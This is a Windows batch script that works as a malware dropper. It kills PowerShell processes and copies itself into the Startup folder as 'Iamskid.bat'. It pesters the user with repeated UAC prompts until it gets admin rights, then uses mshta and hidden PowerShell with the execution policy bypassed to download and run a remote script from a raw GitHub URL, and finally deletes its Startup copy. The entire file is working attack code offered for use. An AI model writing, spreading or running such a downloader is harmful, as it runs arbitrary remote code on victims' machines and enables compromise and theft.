@echo off
taskkill /f /im powershell.exe
cd /d "%~dp0"
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1

:: Kiểm tra quyền quản trị
whoami /groups | findstr /i "S-1-16-12288" >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit
    exit /b
)

mshta vbscript:close(createobject("wscript.shell").run("powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ProgressPreference = 'SilentlyContinue';$t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t\"",0))

del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
